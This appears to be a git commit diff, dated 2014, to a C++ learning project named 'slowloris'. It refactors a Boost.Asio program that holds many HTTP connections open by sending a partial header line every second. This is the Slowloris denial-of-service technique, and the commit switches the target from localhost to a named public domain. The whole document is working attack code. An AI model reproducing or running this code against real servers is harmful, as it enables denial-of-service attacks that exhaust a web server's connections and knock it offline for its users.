4e26d0b38869b1702de5c479bb9b881b0ceb23cd
Yuzo <hyzgog@gmail.com>
2014-12-31 23:52:45 +0800

    use Memory Object

--- slowloris/learn.cpp
+++ slowloris/learn.cpp
@@ -7,20 +7,36 @@ using namespace std;
 using namespace boost;
 using namespace asio;
 
+
+class Memory {
+
+public:
+	Memory(deadline_timer* t, ip::tcp::iostream* s, int i) :
+		timer(t),
+		stream(s),
+		index(i)
+	{
+	}
+
+	deadline_timer* timer;
+	ip::tcp::iostream* stream;
+	int index;
+};
+
 void createStream(deadline_timer* timer, const string& host, const string& path);
-void appendStream(deadline_timer* timer, ip::tcp::iostream* stream);
+void appendStream(Memory* mem);
+
 
 int main(int argc, char *argv[]) {
-	const int requests = 300;
-	const int interval = 5;
-	//const int times = 20;
+	const int requests = 10;
+	const int interval = 1;
 
 	io_service io;
 	deadline_timer** timers = new deadline_timer*[requests];
 
 	for(int i = 0; i < requests; i++){
 		timers[i] = new deadline_timer(io, posix_time::seconds(interval));
-		createStream(timers[i], "localhost", "/");
+		createStream(timers[i], "blog.pillowsky.org", "/");
 	}
 
 	io.run();
@@ -41,14 +57,14 @@ void createStream(deadline_timer* timer, const string& host, const string& path)
 
 	stream->flush();
 
-	timer->async_wait(bind(appendStream, timer, stream));
+	timer->async_wait(bind(appendStream, new Memory(timer, stream, 0)));
 }
 
-void appendStream(deadline_timer* timer, ip::tcp::iostream* stream) {
-	cout << "appendStream" << endl;
-	(*stream) << "X-Via: Linux\r\n";
-	stream->flush();
-
-	timer->expires_from_now(posix_time::seconds(1));
-	timer->async_wait(bind(appendStream, timer, stream));
+void appendStream(Memory* mem) {
+	cout << mem->index << endl;
+	*(mem->stream) << format("X-Trunk: %1%\r\n") % mem->index++;
+	
+	mem->stream->flush();
+	mem->timer->expires_from_now(posix_time::seconds(1));
+	mem->timer->async_wait(bind(appendStream, mem));
 }
